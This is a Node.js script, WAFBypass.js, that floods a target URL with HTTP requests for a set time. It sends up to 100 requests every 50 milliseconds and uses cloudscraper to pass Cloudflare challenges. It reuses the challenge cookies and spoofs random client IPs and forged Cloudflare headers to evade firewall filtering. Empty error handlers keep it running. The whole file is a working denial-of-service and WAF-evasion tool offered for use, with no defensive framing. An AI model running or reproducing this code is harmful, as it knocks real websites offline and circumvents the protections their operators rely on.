const cloudscraper = require('cloudscraper');
const request = require('request');
const randomstring = require("randomstring");

const args = process.argv.slice(2);

function randomByte() {
    return Math.round(Math.random()*256);
}

if (process.argv.length <= 2) {
    console.log("Usage: node WAFBypass.js <url> <time>");
    console.log("Usage: node WAFBypass.js <http://example.com> <60>");
    process.exit(-1);
}

const url = process.argv[2];
const time = process.argv[3];

const int = setInterval(() => {
    for (let i = 0; i < 100; i++) {
        let cookie = 'ASDFGHJKLZXCVBNMQWERTYUIOPasdfghjklzxcvbnmqwertyuiop1234567890';
        let useragent = 'proxy.txt';
        cloudscraper.get(url, (error, response, body) => {
            if (error) {
                console.log('Error occurred');
            } else {
                const parsed = JSON.parse(JSON.stringify(response));
                cookie = (parsed["request"]["headers"]["cookie"]);
                useragent = (parsed["request"]["headers"]["User-Agent"]);
            }
            const rand = randomstring.generate({
                length: 10,
                charset: 'abcdefghijklmnopqstuvwxyz0123456789'
            });
            const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
            const options = {
                url: url,
                headers: {
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '2000',
                    'cookie': cookie,
                    'Origin': `http://${rand}.com`,
                    'Referrer': `http://google.com/${rand}`,
                    'X-Forwarded-For': ip,
                    'X-Real-IP': ip,
                    'X-Proxy-IP': ip,
                    'X-Client-IP': ip,
                    'X-Forwarded-Host': url,
                    'X-Forwarded-Server': url,
                    'X-Host': url,
                    'X-Original-URL': url,
                    'X-Rewrite-URL': url,
                    'CDN-LOOP': 'cloudflare',
                    'CF-Connecting-IP': ip,
                    'CF-IPCountry': 'US',
                    'CF-RAY': ' dummy-ray-id',
                    'CF-Visitor': '{"scheme":"https"}'
                }
            };

            request(options, (error, response, body) => {
                if (error) {
                    console.log('Bypass denied');
                } else {
                    console.log('Bypass successful');
                }
            });
        });
    }
}, 50);

setTimeout(() => clearInterval(int), time * 1000);

process.on('uncaughtException', (err) => {
    
});

process.on('unhandledRejection', (err) => {
    
});